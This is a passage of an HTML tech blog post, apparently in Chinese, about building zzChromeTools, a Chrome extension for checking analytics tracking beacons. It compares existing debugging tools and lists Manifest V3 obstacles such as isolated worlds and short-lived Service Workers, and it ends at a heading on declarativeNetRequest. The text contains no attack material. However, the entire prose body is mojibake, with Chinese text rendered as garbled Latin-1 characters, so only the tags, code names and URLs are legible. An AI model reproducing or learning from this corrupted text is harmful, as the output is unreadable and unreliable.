<p>åœ¨ç°ä»£äº’è”ç½‘ä¼ä¸šçš„è½¯ä»¶äº¤ä»˜é“¾è·¯ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€è¿‡äºå…³æ³¨æ¶æ„çš„å¤æ‚åº¦ã€ç®—æ³•çš„ä¼˜åŠ£ã€é¡µé¢çš„æ¸²æŸ“æ€§èƒ½ï¼ˆFCP/LCPï¼‰ï¼Œå´æå®¹æ˜“å¿½è§†é‚£äº›å¤¹æ‚åœ¨å¼€å‘æµç¨‹ç¼éš™ä¸­çš„â€œå¾®å°æŸè€—â€ã€‚</p>
<p>è¿™å°±å¥½æ¯”ä¸€è¾† F1 èµ›è½¦ï¼Œå¼•æ“å†å¼ºåŠ²ï¼Œå¦‚æœè¿›ç«™æ¢èƒçš„æ—¶é—´ç”±äºèºä¸åˆ€ä¸é¡ºæ‰‹è€Œæ…¢äº† 2 ç§’ï¼Œæœ€ç»ˆçš„æ¯”èµ›ç»“æœå¯èƒ½å°±æ˜¯å¤©å£¤ä¹‹åˆ«ã€‚å¯¹äºå‰ç«¯å¼€å‘è€…è€Œè¨€ï¼Œâ€œåŸ‹ç‚¹æ ¡éªŒâ€å°±æ˜¯é‚£ä¸ªä¸é¡ºæ‰‹çš„èºä¸åˆ€ã€‚</p>
<p>è®©æˆ‘ä»¬è¿˜åŸä¸€ä¸ªæå…¶çœŸå®çš„åœºæ™¯ï¼Œè¿™ä¸ªåœºæ™¯å¯èƒ½æ¯å¤©éƒ½åœ¨æˆåƒä¸Šä¸‡ä¸ªå·¥ä½ä¸Šå‘ç”Ÿï¼š ä½ éœ€è¦å¼€å‘ä¸€ä¸ªç”µå•†å¤§ä¿ƒçš„è½åœ°é¡µã€‚éœ€æ±‚æ–‡æ¡£é‡Œä¸ä»…æœ‰å¤æ‚çš„ UI äº¤äº’ï¼Œè¿˜å¯†å¯†éº»éº»åœ°åˆ—å‡ºäº† 50 ä¸ªåŸ‹ç‚¹éœ€æ±‚ï¼š</p>
<ul>
<li>â€œBanner æ›å…‰ä¸ŠæŠ¥â€</li>
<li>â€œå•†å“å¡ç‰‡ç‚¹å‡»ä¸ŠæŠ¥ï¼Œéœ€æºå¸¦ SKUã€SPUã€RankIdâ€</li>
<li>â€œå•†å“åˆ—è¡¨æ›å…‰ã€å¼¹çª—ç‚¹å‡»æ›å…‰ã€å±•ç¤ºæ›å…‰ä¸ŠæŠ¥ç­‰â€</li>
<li>â€œç”¨æˆ·æ»šåŠ¨æ·±åº¦ä¸ŠæŠ¥â€</li>
<li>â€¦â€¦</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f519ce6130d84ccabb2b8f26ac5bde39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=3p8dA0n04GRh8ZIYuI2DNXI%2F2fE%3D" alt="æ—¥å¸¸åŸ‹ç‚¹éœ€æ±‚" loading="lazy"/></p>
<p>å½“ä½ ç†¬å¤œå†™å®Œä¸šåŠ¡ä»£ç ï¼Œå‡†å¤‡ææµ‹å‰ï¼Œä½ å¿…é¡»ç¡®ä¿è¿™ 50 ä¸ªåŸ‹ç‚¹ä¸€ä¸ªä¸é”™ã€‚å› ä¸ºåœ¨æ•°æ®é©±åŠ¨çš„é€»è¾‘ä¸‹ï¼Œä»£ç è·‘é€šåªæ˜¯åŠæ ¼ï¼Œæ•°æ®å¯¹é½æ‰æ˜¯æ»¡åˆ†ã€‚*å¦‚æœåŸ‹ç‚¹é”™äº†ï¼Œè¿è¥æ‹¿åˆ°çš„æ•°æ®å°±æ˜¯ä¸å®çš„ï¼Œåç»­çš„æ‰€æœ‰è½¬åŒ–åˆ†æã€æ¼æ–—æ¨¡å‹éƒ½å°†å»ºç«‹åœ¨è™šå‡çš„åŸºçŸ³ä¹‹ä¸Šã€‚</p>
<h3 data-id="heading-2">å¼€å‘è€…çš„ä¸€ç™¾ç§â€œå´©æºƒâ€</h3>
<p>äºæ˜¯ï¼Œä½ å¼€å§‹äº†ç—›è‹¦çš„æ ¡éªŒæµç¨‹ã€‚ ä½ ç†Ÿç»ƒåœ°æŒ‰ä¸‹ F12ï¼Œæ‰“å¼€ Chrome DevToolsï¼Œåˆ‡æ¢åˆ° Network é¢æ¿ã€‚ ä½ åˆ·æ–°é¡µé¢ï¼Œçœ‹ç€ Waterfall ç€‘å¸ƒæµç¬é—´æ¶Œå‡ºå‡ ç™¾ä¸ªè¯·æ±‚ã€‚ å›¾ç‰‡ã€JSã€CSSã€å­—ä½“æ–‡ä»¶ã€XHR æ¥å£ã€WebSocket å¿ƒè·³â€¦â€¦å®ƒä»¬æ··æ‚åœ¨ä¸€èµ·ã€‚ä½ çœ¯ç€çœ¼ç›ï¼Œè¯•å›¾åœ¨å…¶ä¸­æ‰¾åˆ°é‚£å‡ ä¸ª <code>gif</code> è¯·æ±‚æˆ–è€… <code>sendBeacon</code> è°ƒç”¨ã€‚</p>
<p><strong>å´©æºƒç¬é—´ Aï¼šå¤§æµ·æé’ˆ</strong> ä½ è¾“å…¥äº†è¿‡æ»¤å…³é”®è¯ <code>lego</code> æˆ–è€… <code>mark-p</code>ã€‚åˆ—è¡¨å˜å°‘äº†ï¼Œä½†ä¾ç„¶æœ‰å‡ åä¸ªã€‚ä½ å¿…é¡»ä¸€ä¸ªä¸€ä¸ªç‚¹å¼€ï¼ŒæŸ¥çœ‹ Headersï¼ŒæŸ¥çœ‹ Payloadã€‚Payload å¯èƒ½æ˜¯å‹ç¼©è¿‡çš„ JSON å­—ç¬¦ä¸²ï¼Œä½ å¾—å¤åˆ¶å‡ºæ¥ï¼Œæ‰“å¼€ä¸€ä¸ªæ–°çš„ Tabï¼Œè®¿é—® <code>JSON.cn</code>ï¼Œç²˜è´´ï¼Œæ ¼å¼åŒ–ï¼Œç„¶åè‚‰çœ¼æ¯”å¯¹ <code>section_id</code> æ˜¯ä¸æ˜¯ <code>10086</code>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1de583760f24ae198af4aa2a471a1f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=Yspzw5uWQ481J9mxJvGJlWIMc6k%3D" alt="Network é¢æ¿" loading="lazy"/></p>
<p><strong>å´©æºƒç¬é—´ Bï¼šç¨çºµå³é€</strong> ä½ éœ€è¦éªŒè¯â€œç‚¹å‡»è·³è½¬â€çš„åŸ‹ç‚¹ã€‚ä½ æ¸…ç©ºäº† Networkï¼Œç‚¹å‡»äº†æŒ‰é’®ã€‚é¡µé¢è·³è½¬äº†ã€‚ å°±åœ¨è·³è½¬çš„ä¸€ç¬é—´ï¼Œä½ çœ‹åˆ°äº†åŸ‹ç‚¹è¯·æ±‚é—ªäº†ä¸€ä¸‹ã€‚ä½†æ˜¯ï¼Œéšç€æ–°é¡µé¢çš„åŠ è½½ï¼ŒNetwork é¢æ¿è¢«ç¬é—´æ¸…ç©ºï¼ˆé™¤éä½ è®°å¾—å‹¾é€‰ Preserve logï¼Œä½†å³ä½¿å‹¾é€‰äº†ï¼Œæ–°é¡µé¢çš„è¯·æ±‚ä¹Ÿä¼šè¿…é€ŸæŠŠæ—§è¯·æ±‚æ·¹æ²¡ï¼‰ã€‚ ä½ ä¸å¾—ä¸é‡æ–°æ¥è¿‡ï¼ŒæŠŠæ‰‹é€Ÿç»ƒå¾—åƒç”µç«é€‰æ‰‹ä¸€æ ·ï¼Œè¯•å›¾åœ¨è·³è½¬å‰çš„é‚£å‡ ç™¾æ¯«ç§’å†…æˆªè·æ•°æ®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1837760ceff41a683156a95b986fd88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=I8vJv6TIU9YrG5Xw8XAiGFzTnkQ%3D" alt="è·³è½¬é¡µé¢åæ•°æ®æ— æ³•æŒä¹…åŒ–" loading="lazy"/></p>
<p><strong>å´©æºƒç¬é—´ Cï¼šå‚æ•°é»‘ç›’</strong> äº§å“ç»ç†è·‘è¿‡æ¥é—®ï¼šâ€œä¸ºä»€ä¹ˆè¿™ä¸ªå­—æ®µæ˜¯ç©ºçš„ï¼Ÿâ€ä½ çœ‹ç€é‚£å †ä¹±ç ä¸€æ ·çš„ç¼–ç å‚æ•°ï¼Œå¿ƒé‡Œåªæœ‰ä¸€å¥è¯ï¼šæˆ‘æ€ä¹ˆçŸ¥é“å®ƒæ˜¯åŸæœ¬å°±ç©ºï¼Œè¿˜æ˜¯ä¼ è¾“è¿‡ç¨‹ä¸¢äº†ï¼Ÿ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba13c5f7827a45b4883c31a30c3f66d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=3BcTvVqqfSd%2BSTNnX83suip8XTY%3D" alt="èƒŒæ™¯ç—›ç‚¹" loading="lazy"/></p>
<h3 data-id="heading-3">é—®é¢˜çš„æœ¬è´¨ï¼šè®¤çŸ¥è´Ÿè·è¿‡è½½</h3>
<p>æ ¹æ®æˆ‘ä»¬çš„å†…éƒ¨æ•ˆèƒ½ç»Ÿè®¡ï¼Œä¸€ä¸ªèµ„æ·±å‰ç«¯å¼€å‘åœ¨å¤„ç†â€œåŸ‹ç‚¹è‡ªæµ‹â€è¿™ä¸€ç¯èŠ‚æ—¶ï¼Œå¹³å‡æ¯ä¸ªåŸ‹ç‚¹éœ€è¦æ¶ˆè€— 3 åˆ° 5 åˆ†é’Ÿã€‚è¿™ä¸ä»…æ˜¯æ—¶é—´çš„æµªè´¹ï¼Œæ›´æ˜¯è®¤çŸ¥èµ„æºï¼ˆCognitive Resourcesï¼‰çš„å‰§çƒˆæ¶ˆè€—ã€‚ æ¯ä¸€æ¬¡åˆ‡æ¢çª—å£ã€æ¯ä¸€æ¬¡å¤åˆ¶ç²˜è´´ã€æ¯ä¸€æ¬¡åœ¨æ··ä¹±çš„åˆ—è¡¨ä¸­èšç„¦çœ¼ç¥ï¼Œéƒ½åœ¨æ‰“æ–­å¼€å‘è€…çš„â€œå¿ƒæµâ€ï¼ˆFlowï¼‰ã€‚å½“ä½ ä» JSON æ ¼å¼åŒ–ç½‘ç«™åˆ‡å› IDE æ—¶ï¼Œä½ å¯èƒ½å·²ç»å¿˜äº†åˆšæ‰æƒ³æ”¹çš„é‚£è¡Œä»£ç åœ¨å“ªé‡Œã€‚</p>
<p>è¿™å°±æ˜¯æˆ‘ä»¬å¯åŠ¨ zzChromeTools é¡¹ç›®çš„åˆè¡·ã€‚æˆ‘ä»¬ä¸æ˜¯ä¸ºäº†é€ è½®å­è€Œé€ è½®å­ï¼Œè€Œæ˜¯ä¸ºäº†æŠŠå¼€å‘è€…ä»ä½æ•ˆçš„ã€é‡å¤çš„ã€é«˜è®¤çŸ¥è´Ÿè·çš„åŠ³åŠ¨ä¸­è§£æ”¾å‡ºæ¥ã€‚</p>
<h2 data-id="heading-4">02 ç°çŠ¶</h2>
<p>åœ¨å†³å®šå¼€å‘è‡ªç ”å·¥å…·ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å›ç­”ä¸€ä¸ªé—®é¢˜ï¼šå¸‚é¢ä¸Šå·²æœ‰çš„å·¥å…·ï¼ŒçœŸçš„ä¸å¤Ÿç”¨å—ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯¹ä¸šå†…ä¸»æµçš„ç½‘ç»œè°ƒè¯•æ–¹æ¡ˆè¿›è¡Œäº†æ·±åº¦è°ƒç ”ï¼ŒåŒ…æ‹¬æµè§ˆå™¨åŸç”Ÿå·¥å…·ã€ä»£ç†æŠ“åŒ…å·¥å…·ä»¥åŠç¬¬ä¸‰æ–¹æ’ä»¶ã€‚ç»“è®ºæ˜¯ï¼šå®ƒä»¬éƒ½å¾ˆå¼ºå¤§ï¼Œä½†åœ¨â€œåŸ‹ç‚¹æ ¡éªŒâ€è¿™ä¸ªå‚ç›´ç»†åˆ†é¢†åŸŸï¼Œå®ƒä»¬éƒ½å­˜åœ¨ç€ä¸¥é‡çš„â€œä¿¡å™ªæ¯”â€ï¼ˆSignal-to-Noise Ratioï¼‰è¿‡ä½çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-5">Chrome DevTools Network é¢æ¿ï¼šå…¨èƒ½é€‰æ‰‹çš„è½¯è‚‹</h3>
<p>Chrome çš„ Network é¢æ¿æ˜¯æ‰€æœ‰å‰ç«¯å¼€å‘è€…çš„â€œæ¯è¯­â€ã€‚å®ƒçš„ä¼˜åŠ¿åœ¨äºåŸç”Ÿã€é›¶æˆæœ¬ã€ä¿¡æ¯å…¨ã€‚ ä½†â€œä¿¡æ¯å…¨â€æ°æ°æ˜¯å®ƒçš„è½¯è‚‹ã€‚</p>
<ul>
<li>æ— å·®åˆ«å¯¹å¾…ï¼š å®ƒå¹³ç­‰åœ°å±•ç¤ºæ¯ä¸€ä¸ª HTTP è¯·æ±‚ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼ŒåŠ è½½ä¸€å¼ å›¾ç‰‡å’Œä¸ŠæŠ¥ä¸€æ¡åŸ‹ç‚¹æ•°æ®ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰åŒºåˆ«ã€‚ä½†åœ¨ä¸šåŠ¡é€»è¾‘ä¸Šï¼ŒåŸ‹ç‚¹æ•°æ®çš„é‡è¦æ€§è¿œé«˜äºé™æ€èµ„æºã€‚åœ¨ Network é¢æ¿ä¸­ï¼Œæ ¸å¿ƒä¿¡å·ï¼ˆåŸ‹ç‚¹ï¼‰è¢«æµ·é‡çš„å™ªéŸ³ï¼ˆé™æ€èµ„æºï¼‰æ·¹æ²¡äº†ã€‚</li>
<li>ç¼ºä¹è¯­ä¹‰åŒ–ï¼š Network é¢æ¿åªå±•ç¤º HTTP åè®®å±‚é¢çš„ä¿¡æ¯ï¼ˆStatus, Type, Sizeï¼‰ã€‚å®ƒä¸æ‡‚ä½ çš„ä¸šåŠ¡ã€‚å®ƒä¸çŸ¥é“ <code>section_id</code> æ˜¯ä»€ä¹ˆï¼Œå®ƒæ— æ³•å¸®ä½ é«˜äº®æ˜¾ç¤ºâ€œé”™è¯¯çš„å‚æ•°â€ã€‚</li>
<li>ä¸Šä¸‹æ–‡æ˜“å¤±ï¼š è™½ç„¶æœ‰ Preserve logï¼Œä½†åœ¨å¤šé¡µé¢è·³è½¬ã€SPA è·¯ç”±åˆ‡æ¢çš„å¤æ‚åœºæ™¯ä¸‹ï¼Œæ—¥å¿—çš„ç®¡ç†ä¾ç„¶éå¸¸æ··ä¹±ã€‚</li>
</ul>
<h3 data-id="heading-6">Charles / Fiddler / Whistleï¼šé‡å‹æ­¦å™¨çš„æ€é¸¡ç”¨ç‰›åˆ€</h3>
<p>Charlesã€Fiddler ä»¥åŠ Whistle æ˜¯æŠ“åŒ…ç•Œçš„ç¥å™¨ã€‚å®ƒä»¬æ”¯æŒå¼ºå¤§çš„æ–­ç‚¹ã€é‡å†™ã€HTTPS è§£å¯†ã€‚ ä½†æ˜¯ï¼Œç”¨å®ƒä»¬æ¥æŸ¥åŸ‹ç‚¹ï¼Œå¤ªé‡äº†ã€‚</p>
<ul>
<li>é…ç½®æˆæœ¬é«˜ï¼š ä½ éœ€è¦å®‰è£…è¯ä¹¦ã€é…ç½®ç³»ç»Ÿä»£ç†ã€è®¾ç½®æ‰‹æœº WiFi ä»£ç†ã€‚å¯¹äºä»…ä»…æƒ³åœ¨ PC æµè§ˆå™¨ä¸Šå¿«é€Ÿçœ‹ä¸€çœ¼åŸ‹ç‚¹çš„åœºæ™¯ï¼Œè¿™ä¸ªå¯åŠ¨æˆæœ¬å¤ªé«˜ã€‚</li>
<li>æ•°æ®éš”ç¦»å·®ï¼š å¼€å¯ç³»ç»Ÿä»£ç†åï¼Œä½ ç”µè„‘ä¸Šæ‰€æœ‰è½¯ä»¶çš„ç½‘ç»œè¯·æ±‚ï¼ˆQQã€å¾®ä¿¡ã€ç³»ç»Ÿæ›´æ–°ï¼‰éƒ½ä¼šæ¶Œå…¥ Charlesã€‚ä½ ä¾ç„¶éœ€è¦èŠ±è´¹å¤§é‡ç²¾åŠ›å»å†™ Include/Exclude è§„åˆ™æ¥è¿‡æ»¤ã€‚</li>
<li>è§†è§‰äº¤äº’å·®ï¼š å®ƒä»¬çš„ JSON è§£æèƒ½åŠ›è™½ç„¶æœ‰ï¼Œä½†å¾€å¾€ä¹Ÿæ˜¯é€šç”¨çš„æ ‘çŠ¶ç»“æ„ï¼Œæ— æ³•é’ˆå¯¹ç‰¹å®šçš„åŸ‹ç‚¹å­—æ®µè¿›è¡Œå®šåˆ¶åŒ–å±•ç¤ºã€‚</li>
</ul>
<h3 data-id="heading-7">ç°æœ‰çš„åŸ‹ç‚¹æ’ä»¶ï¼ˆOmniBug ç­‰ï¼‰</h3>
<p>å¸‚é¢ä¸Šä¹Ÿæœ‰ä¸€äº›ä¼˜ç§€çš„åŸ‹ç‚¹æ’ä»¶ï¼Œå¦‚ OmniBugã€‚å®ƒä»¬ç¡®å®è§£å†³äº†éƒ¨åˆ†é—®é¢˜ã€‚ ä½†å®ƒä»¬çš„å±€é™æ€§åœ¨äºï¼š</p>
<ul>
<li>é€‚é…æ€§é—®é¢˜ï¼š å¾€å¾€åªé€‚é… Adobe Analyticsã€Google Analytics ç­‰å›½é™…é€šç”¨æ ‡å‡†ã€‚å¯¹äºå›½å†…å¤§å‚è‡ªç ”çš„åŸ‹ç‚¹ SDKï¼ˆå¾€å¾€æœ‰è‡ªå®šä¹‰çš„åŠ å¯†åè®®ã€ç‰¹æ®Šçš„å­—æ®µç»“æ„ï¼‰ï¼Œå®ƒä»¬æ— èƒ½ä¸ºåŠ›ã€‚</li>
<li>åŠŸèƒ½å•ä¸€ï¼š ä»…ä»…å±•ç¤ºæ•°æ®ï¼Œç¼ºä¹ä¸æœ¬åœ°å¼€å‘ç¯å¢ƒçš„è”åŠ¨ï¼ˆå¦‚ Whistle ä»£ç†æ§åˆ¶ï¼‰ã€‚</li>
</ul>
<p><strong>æ€»ç»“ï¼š</strong> ç°æœ‰çš„å·¥å…·é“¾å­˜åœ¨ä¸€ä¸ªå·¨å¤§çš„çœŸç©ºåœ°å¸¦ã€‚ æˆ‘ä»¬éœ€è¦ä¸€æ¬¾è½»é‡çº§ï¼ˆæ— éœ€é…ç½®ä»£ç†ï¼‰ã€å®šåˆ¶åŒ–ï¼ˆæ‡‚å†…éƒ¨ä¸šåŠ¡é€»è¾‘ï¼‰ã€é«˜ä¿¡å™ªæ¯”ï¼ˆè‡ªåŠ¨é™å™ªï¼‰ä¸”æŒä¹…åŒ–ï¼ˆä¸æ€•é¡µé¢åˆ·æ–°ï¼‰çš„æµè§ˆå™¨æ‰©å±•ã€‚ è¿™å°±æ˜¯ zzChromeTools çš„å®šä½ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6374d4dc2d034e14960479d4d76e911c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=T0VX03OZbI5fEO7Oj%2Fz1Tu0IS%2FU%3D" alt="å¤šæ¸ é“ä¼˜ç‚¹å¯¹æ¯”" loading="lazy"/></p>
<h2 data-id="heading-8">03 éš¾ç‚¹</h2>
<p>å½“æˆ‘ä»¬ç«‹é¡¹å¹¶å‡†å¤‡åŠ¨æ‰‹å¼€å‘æ—¶ï¼Œæ°é€¢ Chrome æ‰©å±•ç”Ÿæ€è¿æ¥äº†ä¸€æ¬¡å²æ— å‰ä¾‹çš„â€œå¤§åœ°éœ‡â€â€”â€”Manifest V3 (MV3) çš„å¼ºåˆ¶æ¨è¡Œã€‚</p>
<p>å¦‚æœæ‚¨å…³æ³¨è¿‡æµè§ˆå™¨æŠ€æœ¯ï¼Œå°±ä¼šçŸ¥é“ï¼ŒGoogle å®£å¸ƒåœ¨ 2024 å¹´é€æ­¥åœæ­¢å¯¹ Manifest V2 (MV2) çš„æ”¯æŒã€‚è¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¼€å‘çš„æ–°å·¥å…·å¿…é¡»ï¼Œä¹Ÿåªèƒ½åŸºäº MV3 æ¶æ„ã€‚</p>
<p>ä» MV2 åˆ° MV3ï¼Œä¸æ˜¯ç®€å•çš„ç‰ˆæœ¬å· +1ï¼Œè€Œæ˜¯åº•å±‚å®‰å…¨æ¨¡å‹å’Œè¿›ç¨‹æ¨¡å‹çš„èŒƒå¼è½¬ç§»ï¼ˆParadigm Shiftï¼‰ã€‚å¯¹äºæ’ä»¶å¼€å‘è€…æ¥è¯´ï¼Œè¿™ç®€ç›´æ˜¯ä¸€åœºâ€œç¾éš¾â€èˆ¬çš„æŒ‘æˆ˜ã€‚</p>
<h3 data-id="heading-9">éš¾ç‚¹ä¸€ï¼šâ€œéš”ç¦»ä¸–ç•Œâ€çš„é“å£é“œå¢™</h3>
<p>åœ¨æµè§ˆå™¨æ‰©å±•çš„æ¶æ„ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µå«â€œéš”ç¦»ä¸–ç•Œâ€ï¼ˆIsolated Worldï¼‰ã€‚</p>
<ul>
<li>é¡µé¢è„šæœ¬ï¼ˆPage Scriptï¼‰ï¼š ä¹Ÿå°±æ˜¯ä½ çš„ä¸šåŠ¡ä»£ç ï¼Œè¿è¡Œåœ¨ä¸»ä¸–ç•Œï¼ˆMain Worldï¼‰ã€‚</li>
<li>å†…å®¹è„šæœ¬ï¼ˆContent Scriptï¼‰ï¼š æ’ä»¶æ³¨å…¥åˆ°é¡µé¢çš„ä»£ç ï¼Œè¿è¡Œåœ¨éš”ç¦»ä¸–ç•Œã€‚</li>
</ul>
<p>åœ¨ MV2 æ—¶ä»£ï¼Œè™½ç„¶ä¸¤è€… JS ç¯å¢ƒéš”ç¦»ï¼Œä½† Content Script å¯¹ DOM çš„è®¿é—®æƒé™éå¸¸å¤§ï¼Œä¸”é€šè¿‡ç®€å•çš„ <code>&lt;script&gt;</code> æ ‡ç­¾æ³¨å…¥å°±èƒ½è½»æ¾æ‰“ç ´éš”ç¦»ï¼Œç›´æ¥è®¿é—®é¡µé¢å…¨å±€å˜é‡ã€‚</p>
<p>ä½†åœ¨ MV3 ä¸­ï¼ŒGoogle ä¸ºäº†å®‰å…¨ï¼ˆé˜²æ­¢æ’ä»¶çªƒå–ç”¨æˆ·æ•°æ®ï¼‰ï¼Œæå¤§åœ°æ”¶ç´§äº†æƒé™ã€‚ æˆ‘ä»¬çš„éœ€æ±‚æ˜¯ï¼šæ‹¦æˆªé¡µé¢å‘å‡ºçš„ <code>navigator.sendBeacon</code> è¯·æ±‚ã€‚ ä¸šåŠ¡ä»£ç è°ƒç”¨çš„æ˜¯ <code>window.navigator.sendBeacon</code>ã€‚å¦‚æœæˆ‘ä»¬åªæ˜¯åœ¨ Content Script é‡Œé‡å†™è¿™ä¸ªå‡½æ•°ï¼Œæ˜¯å®Œå…¨æ²¡ç”¨çš„ã€‚å› ä¸ºä¸šåŠ¡ä»£ç è¿è¡Œåœ¨ä¸»ä¸–ç•Œï¼Œå®ƒçœ‹ä¸åˆ°éš”ç¦»ä¸–ç•Œçš„ä¿®æ”¹ã€‚ å¦‚ä½•åˆæ³•åœ°ã€å®‰å…¨åœ°ç©¿é€è¿™å±‚â€œæ¬¡å…ƒå£â€ï¼Œå»ç›‘å¬ä¸»ä¸–ç•Œçš„ API è°ƒç”¨ï¼Ÿ è¿™æ˜¯ç¬¬ä¸€ä¸ªæŠ€æœ¯æ‹¦è·¯è™ã€‚</p>
<h3 data-id="heading-10">éš¾ç‚¹äºŒï¼šService Worker çš„â€œå—œç¡ç—‡â€</h3>
<p>MV3 åšå‡ºçš„æœ€å¤§æ”¹å˜ï¼Œå°±æ˜¯ç§»é™¤äº† MV2 ä¸­å¸¸é©»åå°çš„ <code>Background Page</code>ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ <code>Service Worker</code>ã€‚</p>
<ul>
<li>Background Page (MV2)ï¼š å°±åƒä¸€ä¸ª 7x24 å°æ—¶è¿è¡Œçš„åå°æœåŠ¡å™¨ã€‚ä½ å¯ä»¥åœ¨é‡Œé¢å­˜å˜é‡ï¼Œå®ƒæ°¸è¿œéƒ½åœ¨ã€‚</li>
<li>Service Worker (MV3)ï¼š å®ƒæ˜¯ç¬æ€ï¼ˆEphemeralï¼‰çš„ã€‚å®ƒæ˜¯äº‹ä»¶é©±åŠ¨çš„ã€‚å½“æ²¡æœ‰äº‹ä»¶å‘ç”Ÿæ—¶ï¼ˆæ¯”å¦‚å‡ åˆ†é’Ÿæ²¡æ“ä½œï¼‰ï¼Œæµè§ˆå™¨ä¼šå¼ºåˆ¶æ€æ‰è¿™ä¸ª Service Worker è¿›ç¨‹ä»¥èŠ‚çœå†…å­˜ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ è¿™æ„å‘³ç€å¦‚æœä½ åœ¨ Background é‡Œç”¨ä¸€ä¸ªå…¨å±€å˜é‡ <code>let logs = []</code> æ¥å­˜åŸ‹ç‚¹æ•°æ®ï¼Œåªè¦ä½ å»ä¸Šä¸ªå•æ‰€å›æ¥ï¼ŒService Worker å¯èƒ½å°±é‡å¯äº†ï¼Œä½ çš„æ•°æ®å…¨ä¸¢äº†ï¼ å¯¹äºä¸€ä¸ªéœ€è¦é•¿æ—¶é—´è®°å½•æ—¥å¿—çš„å·¥å…·æ¥è¯´ï¼Œè¿™ç§â€œå¥å¿˜â€çš„ç‰¹æ€§æ˜¯è‡´å‘½çš„ã€‚å¦‚ä½•åœ¨ä¸€ä¸ªæ— çŠ¶æ€çš„ã€éšæ—¶å¯èƒ½æ­»äº¡çš„è¿›ç¨‹ä¸­ä¿æŒæ•°æ®çš„è¿ç»­æ€§ï¼Ÿè¿™æ˜¯ç¬¬äºŒä¸ªéš¾ç‚¹ã€‚</p>
<h3 data-id="heading-11">éš¾ç‚¹ä¸‰ï¼šé€šä¿¡é“¾è·¯çš„è¿·å®«</h3>
<p>æ•°æ®äº§ç”Ÿåœ¨é¡µé¢ï¼ˆPageï¼‰ï¼Œæ‹¦æˆªåœ¨è„šæœ¬ï¼ˆScriptï¼‰ï¼Œå¤„ç†åœ¨åå°ï¼ˆService Workerï¼‰ï¼Œå±•ç¤ºåœ¨é¢æ¿ï¼ˆDevTools Panelï¼‰ã€‚ è¿™å°±æ¶‰åŠåˆ°äº† 4 ä¸ªå®Œå…¨ç‹¬ç«‹çš„ä¸Šä¸‹æ–‡ ä¹‹é—´çš„é€šä¿¡ã€‚ MV3 åºŸé™¤äº†å¾ˆå¤šé˜»å¡å¼çš„ APIï¼Œå¼ºåˆ¶ä½¿ç”¨å¼‚æ­¥é€šä¿¡ã€‚ ç‰¹åˆ«æ˜¯ <code>Service Worker</code> åˆ° <code>DevTools Panel</code> çš„é€šä¿¡ã€‚ç”±äº Service Worker æ˜¯è¢«åŠ¨çš„ï¼Œè€Œ DevTools æ˜¯ç”¨æˆ·ä¸»åŠ¨æŸ¥çœ‹çš„ï¼Œå¦‚ä½•å»ºç«‹ä¸€ä¸ªé«˜æ•ˆçš„ã€ä½å»¶è¿Ÿçš„ç®¡é“ï¼Ÿ ä¼ ç»Ÿçš„ <code>chrome.runtime.connect</code> é•¿è¿æ¥åœ¨ MV3 çš„ Service Worker ä¸­å˜å¾—éå¸¸è„†å¼±ï¼ˆå®¹æ˜“æ–­è¿ï¼‰ã€‚</p>
<p>é¢å¯¹è¿™äº›ç”± MV3 å¸¦æ¥çš„â€œé™ç»´æ‰“å‡»â€ï¼Œæˆ‘ä»¬æ²¡æœ‰é€€è·¯ï¼Œåªèƒ½åœ¨æ¶æ„è®¾è®¡ä¸Šè¿›è¡Œæ·±åº¦çªå›´ã€‚</p>
<h2 data-id="heading-12">04 ä¸šå†…æ–¹æ¡ˆ</h2>
<p>åœ¨è¯¦ç»†ä»‹ç»æˆ‘ä»¬çš„æ–¹æ¡ˆä¹‹å‰ï¼Œæœ‰å¿…è¦çœ‹çœ‹é’ˆå¯¹ç±»ä¼¼é—®é¢˜ï¼Œä¸šå†…åŒè¡Œä»¬é€šå¸¸æ˜¯å¦‚ä½•è§£å†³çš„ï¼Œä»¥åŠä¸ºä»€ä¹ˆæˆ‘ä»¬æ²¡æœ‰é‡‡ç”¨è¿™äº›æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-13">æ–¹æ¡ˆ Aï¼š<code>declarativeNetRequest</code> (DNR)</h3>
